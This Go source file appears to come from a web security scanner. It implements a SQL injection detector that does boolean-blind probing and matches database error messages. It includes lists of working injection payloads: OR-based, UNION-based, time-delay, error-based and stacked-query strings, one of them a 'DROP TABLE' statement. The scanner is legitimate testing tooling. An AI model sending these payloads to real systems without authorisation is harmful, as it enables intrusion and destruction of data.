package injection

import (
	"context"
	"net/url"
	"regexp"
	"strings"

	"github.com/swiss-knife-for-web-security/skws/internal/detection/analysis"
	skwshttp "github.com/swiss-knife-for-web-security/skws/internal/http"
)

// blindSQLiSimilarityThreshold is the Jaccard cutoff for considering two
// stripped response bodies "equivalent" in the boolean-blind probe. 0.9
// matches the BooleanDifferential default and tolerates per-request
// nonces (CSRF tokens, request IDs) without merging genuinely different
// result-set responses.
const blindSQLiSimilarityThreshold = 0.9

// PayloadContext represents the detected context of a parameter.
type PayloadContext int

const (
	ContextUnknown PayloadContext = iota
	ContextString
	ContextNumeric
)

// String returns the string representation of PayloadContext.
func (c PayloadContext) String() string {
	switch c {
	case ContextString:
		return "string"
	case ContextNumeric:
		return "numeric"
	default:
		return "unknown"
	}
}

// DatabaseType represents the detected database type.
type DatabaseType int

const (
	DBUnknown DatabaseType = iota
	DBMySQL
	DBPostgreSQL
	DBMSSQL
	DBOracle
	DBSQLite
)

// String returns the string representation of DatabaseType.
func (d DatabaseType) String() string {
	switch d {
	case DBMySQL:
		return "mysql"
	case DBPostgreSQL:
		return "postgresql"
	case DBMSSQL:
		return "mssql"
	case DBOracle:
		return "oracle"
	case DBSQLite:
		return "sqlite"
	default:
		return "unknown"
	}
}

// AnalysisResult contains the result of SQL injection analysis.
type AnalysisResult struct {
	IsVulnerable  bool
	DetectionType string
	Confidence    float64
	Evidence      string
	DatabaseType  DatabaseType
}

// BooleanResult contains the result of boolean-based blind SQLi detection.
// Populated by DetectBoolean. TruePayload / FalsePayload identify the pair
// that produced the differential, so callers can report and re-prove it.
type BooleanResult struct {
	IsVulnerable  bool
	DetectionType string
	Confidence    float64
	TruePayload   string
	FalsePayload  string
}

// booleanPayloadPair describes one (true, false) probe pair plus a build
// strategy that decides how the payload is combined with the parameter's
// original value. Most real-world blind SQLi sinks (PortSwigger labs,
// `?category=Gifts`-style) need the injection APPENDED to the original
// value so the SQL clause stays syntactically valid; some sinks
// (`searchTerm=test` LIKE-wrapped) need the payload replacing the value.
// We probe both shapes per pair.
type booleanPayloadPair struct {
	name         string
	truePayload  string
	falsePayload string
}

var booleanPayloadPairs = []booleanPayloadPair{
	{"single-quote", "' AND '1'='1", "' AND '1'='2"},
	{"single-quote-or", "' OR '1'='1", "' OR '1'='2"},
	{"single-quote-comment", "' AND '1'='1' --", "' AND '1'='2' --"},
	{"double-quote", "\" AND \"1\"=\"1", "\" AND \"1\"=\"2"},
	{"numeric", " AND 1=1", " AND 1=2"},
	{"numeric-or", " OR 1=1", " OR 1=2"},
}

// SQLiDetector detects SQL injection vulnerabilities.
type SQLiDetector struct {
	errorPatterns map[DatabaseType][]*regexp.Regexp
}

// NewSQLiDetector creates a new SQL injection detector.
func NewSQLiDetector() *SQLiDetector {
	detector := &SQLiDetector{
		errorPatterns: make(map[DatabaseType][]*regexp.Regexp),
	}
	detector.initErrorPatterns()
	return detector
}

// Name returns the detector name.
func (d *SQLiDetector) Name() string {
	return "sqli"
}

// Description returns the detector description.
func (d *SQLiDetector) Description() string {
	return "SQL Injection vulnerability detector using error-based, boolean-based, and time-based techniques"
}

// initErrorPatterns initializes database-specific error patterns.
func (d *SQLiDetector) initErrorPatterns() {
	// MySQL patterns
	d.errorPatterns[DBMySQL] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)you have an error in your sql syntax`),
		regexp.MustCompile(`(?i)check the manual that corresponds to your (mysql|mariadb) server version`),
		regexp.MustCompile(`(?i)mysql.*error`),
		regexp.MustCompile(`(?i)warning.*mysql`),
	}

	// PostgreSQL patterns
	d.errorPatterns[DBPostgreSQL] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)ERROR:\s*syntax error at or near`),
		regexp.MustCompile(`(?i)pg_query\(\).*failed`),
		regexp.MustCompile(`(?i)unterminated quoted string`),
		regexp.MustCompile(`(?i)postgresql.*error`),
	}

	// MSSQL patterns
	d.errorPatterns[DBMSSQL] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)unclosed quotation mark`),
		regexp.MustCompile(`(?i)microsoft sql server`),
		regexp.MustCompile(`(?i)mssql.*error`),
		regexp.MustCompile(`(?i)sql server.*error`),
	}

	// Oracle patterns
	d.errorPatterns[DBOracle] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)ORA-\d{5}`),
		regexp.MustCompile(`(?i)oracle.*error`),
		regexp.MustCompile(`(?i)quoted string not properly terminated`),
	}

	// SQLite patterns
	d.errorPatterns[DBSQLite] = []*regexp.Regexp{
		regexp.MustCompile(`(?i)SQLITE_ERROR`),
		regexp.MustCompile(`(?i)sqlite3\..*Error`),
		regexp.MustCompile(`(?i)SQLite.*syntax`),
	}
}

// genericSQLPatterns returns patterns that indicate SQL errors regardless of database type.
var genericSQLPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)sql\s*syntax.*error`),
	regexp.MustCompile(`(?i)syntax\s*error.*sql`),
	regexp.MustCompile(`(?i)unexpected\s*end\s*of\s*sql`),
	regexp.MustCompile(`(?i)invalid\s*sql`),
	regexp.MustCompile(`(?i)sql\s*command`),
}

// DetectBoolean probes a parameter for boolean-based blind SQLi by sending
// (baseline, true-condition, false-condition) triples for each canonical
// payload pair and watching for a TRUE/FALSE-controlled response shape.
//
// We probe two payload shapes per pair: REPLACE (payload becomes the value)
// and APPEND (original value + payload). PortSwigger-style sinks
// (?category=Gifts) need APPEND; searchTerm-style sinks where the baseline
// matches nothing benefit from REPLACE. We also accept differentials in
// either direction (baseline ≈ true, ≠ false) OR (baseline ≈ false, ≠ true)
// — both shapes prove the parameter controls the query result.
//
// AnalyzeResponse alone misses every blind variant; this primitive is what
// closes the gap.
func (d *SQLiDetector) DetectBoolean(
	ctx context.Context,
	client *skwshttp.Client,
	targetURL, param, method string,
) (*BooleanResult, error) {
	res := &BooleanResult{}
	if client == nil {
		return res, nil
	}

	originalValue := extractParamValue(targetURL, param)

	// Build candidate (truePayload, falsePayload) probes from the static
	// pairs × {REPLACE, APPEND} shapes. Empty originalValue collapses APPEND
	// onto REPLACE, so we dedupe by string.
	type probe struct {
		shape string
		t, f  string
	}
	seen := make(map[string]bool)
	var probes []probe
	for _, pair := range booleanPayloadPairs {
		add := func(shape, tp, fp string) {
			key := shape + "|" + tp + "|" + fp
			if seen[key] {
				return
			}
			seen[key] = true
			probes = append(probes, probe{shape, tp, fp})
		}
		add("replace", pair.truePayload, pair.falsePayload)
		if originalValue != "" {
			add("append", originalValue+pair.truePayload, originalValue+pair.falsePayload)
		}
	}

	// Baseline is the original URL — sent ONCE, reused across all probes.
	baselineResp, err := client.Get(ctx, targetURL)
	if err != nil || baselineResp == nil {
		return res, err
	}
	baselineStripped := analysis.StripDynamicContent(baselineResp.Body)

	for _, p := range probes {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}

		trueResp, err := client.SendPayload(ctx, targetURL, param, p.t, method)
		if err != nil || trueResp == nil {
			continue
		}
		falseResp, err := client.SendPayload(ctx, targetURL, param, p.f, method)
		if err != nil || falseResp == nil {
			continue
		}

		// Only meaningful if true and false are themselves divergent.
		// If true≈false, the parameter doesn't matter at all (or the
		// request is being WAFed identically) — no differential to claim.
		trueStripped := analysis.StripDynamicContent(trueResp.Body)
		falseStripped := analysis.StripDynamicContent(falseResp.Body)
		trueFalseSim := analysis.ResponseSimilarity(trueStripped, falseStripped)
		if trueFalseSim >= blindSQLiSimilarityThreshold {
			continue
		}

		baseTrueSim := analysis.ResponseSimilarity(baselineStripped, trueStripped)
		baseFalseSim := analysis.ResponseSimilarity(baselineStripped, falseStripped)

		baseTrueClose := baseTrueSim >= blindSQLiSimilarityThreshold
		baseFalseClose := baseFalseSim >= blindSQLiSimilarityThreshold

		// Differential in either direction:
		//   shape A: baseline ≈ true,  baseline ≠ false   (PortSwigger /catalog?category=Gifts)
		//   shape B: baseline ≈ false, baseline ≠ true    (no-match baseline, true reveals data)
		var confidence float64
		switch {
		case baseTrueClose && !baseFalseClose:
			confidence = baseTrueSim * (1.0 - baseFalseSim)
		case baseFalseClose && !baseTrueClose:
			confidence = baseFalseSim * (1.0 - baseTrueSim)
		default:
			continue
		}

		res.IsVulnerable = true
		res.DetectionType = "boolean-based"
		res.Confidence = confidence
		res.TruePayload = p.t
		res.FalsePayload = p.f
		return res, nil
	}
	return res, nil
}

// extractParamValue returns the current value of the named query parameter
// in rawURL, or "" if unset/malformed.
func extractParamValue(rawURL, param string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	return u.Query().Get(param)
}

// AnalyzeResponse analyzes an HTTP response for SQL injection indicators.
func (d *SQLiDetector) AnalyzeResponse(response string) *AnalysisResult {
	result := &AnalysisResult{
		IsVulnerable: false,
		DatabaseType: DBUnknown,
	}

	if response == "" {
		return result
	}

	// Check database-specific patterns
	for dbType, patterns := range d.errorPatterns {
		for _, pattern := range patterns {
			if pattern.MatchString(response) {
				result.IsVulnerable = true
				result.DetectionType = "error-based"
				result.DatabaseType = dbType
				result.Evidence = extractMatch(pattern, response)
				result.Confidence = 0.9
				return result
			}
		}
	}

	// Check generic SQL patterns
	for _, pattern := range genericSQLPatterns {
		if pattern.MatchString(response) {
			result.IsVulnerable = true
			result.DetectionType = "error-based"
			result.Evidence = extractMatch(pattern, response)
			result.Confidence = 0.7
			return result
		}
	}

	return result
}

// extractMatch extracts the matching portion from the response.
func extractMatch(pattern *regexp.Regexp, response string) string {
	match := pattern.FindString(response)
	if len(match) > 100 {
		return match[:100] + "..."
	}
	return match
}

// DetectDBType detects the database type from response content.
func (d *SQLiDetector) DetectDBType(response string) DatabaseType {
	responseLower := strings.ToLower(response)

	// Check for database-specific indicators
	if strings.Contains(responseLower, "mysql") ||
		strings.Contains(response, "MariaDB") {
		return DBMySQL
	}

	if strings.Contains(responseLower, "postgresql") ||
		strings.Contains(responseLower, "pg_") ||
		strings.Contains(response, "ERROR: syntax error at or near") {
		return DBPostgreSQL
	}

	if strings.Contains(responseLower, "microsoft sql server") ||
		strings.Contains(responseLower, "mssql") ||
		strings.Contains(responseLower, "sql server") {
		return DBMSSQL
	}

	if strings.Contains(response, "ORA-") ||
		strings.Contains(responseLower, "oracle") {
		return DBOracle
	}

	if strings.Contains(response, "SQLITE") ||
		strings.Contains(responseLower, "sqlite") {
		return DBSQLite
	}

	return DBUnknown
}

// GetPayloads returns a list of SQL injection test payloads.
func (d *SQLiDetector) GetPayloads() []string {
	return []string{
		// Basic quotes
		"'",
		"\"",

		// Classic OR-based
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"1 OR 1=1",
		"1' OR '1'='1",

		// Comment-based
		"'--",
		"'#",
		"' /*",

		// UNION-based
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION ALL SELECT NULL--",

		// Stacked queries
		"'; SELECT 1--",
		"'; DROP TABLE test--",

		// Time-based
		"' OR SLEEP(5)--",
		"'; WAITFOR DELAY '0:0:5'--",
		"' OR pg_sleep(5)--",

		// Error-based
		"' AND 1=CONVERT(int, @@version)--",
		"' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
	}
}

// GetContextPayloads returns payloads optimized for the detected context.
func (d *SQLiDetector) GetContextPayloads(context PayloadContext) []string {
	switch context {
	case ContextString:
		return []string{
			"'",
			"''",
			"' OR '1'='1",
			"' OR '1'='1'--",
			"' AND '1'='2",
			"' UNION SELECT NULL--",
		}
	case ContextNumeric:
		return []string{
			"1 OR 1=1",
			"1 AND 1=2",
			"1 UNION SELECT NULL",
			"1; SELECT 1",
		}
	default:
		// Unknown context - return comprehensive set
		return []string{
			"'",
			"\"",
			"' OR '1'='1",
			"1 OR 1=1",
			"' UNION SELECT NULL--",
			"1 UNION SELECT NULL",
			"'--",
			"'; SELECT 1--",
		}
	}
}
